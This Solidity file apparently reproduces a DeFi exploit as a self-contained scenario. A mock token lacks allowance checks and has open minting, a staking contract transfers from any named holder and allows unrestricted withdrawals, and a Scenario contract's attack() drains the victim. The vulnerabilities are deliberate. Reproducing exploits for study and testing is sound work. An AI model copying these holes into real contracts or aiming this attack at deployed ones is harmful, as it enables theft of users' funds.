// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
contract NewFiBUSD { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function approve(address a,uint256 n) external returns(bool){allowance[msg.sender][a]=n;return true;} function transferFrom(address f,address t,uint256 n) external returns(bool){require(balanceOf[f]>=n);balanceOf[f]-=n;balanceOf[t]+=n;return true;} function mint(address a,uint256 n) external {balanceOf[a]+=n;} function transfer(address a,uint256 n) external returns(bool){require(balanceOf[msg.sender]>=n);balanceOf[msg.sender]-=n;balanceOf[a]+=n;return true;} }
contract StakedV3 { NewFiBUSD public immutable asset; uint256 public invested; address public immutable admin; constructor(NewFiBUSD a){asset=a;admin=msg.sender;}
function Invest(address holder,uint256 n) external { asset.transferFrom(holder,address(this),n); invested+=n; } function withdraw(address to,uint256 n) external { require(invested>0); asset.transfer(to,n); invested-=n; }
}
contract Scenario { NewFiBUSD public asset; StakedV3 public target; address public victim; uint256 public constant SEED=1000000 ether; constructor(){asset=new NewFiBUSD();target=new StakedV3(asset);victim=address(target); asset.mint(victim,SEED); asset.mint(address(this),SEED);}
function attack(address receiver) external { asset.approve(address(target),SEED); target.Invest(victim,SEED/2); target.withdraw(receiver,SEED/2); }
function reserveBalance() external view returns(uint256){return asset.balanceOf(victim);}
function attackerBalance(address a) external view returns(uint256){return asset.balanceOf(a);}
function assetAddress() external view returns(address){return address(asset);}
}
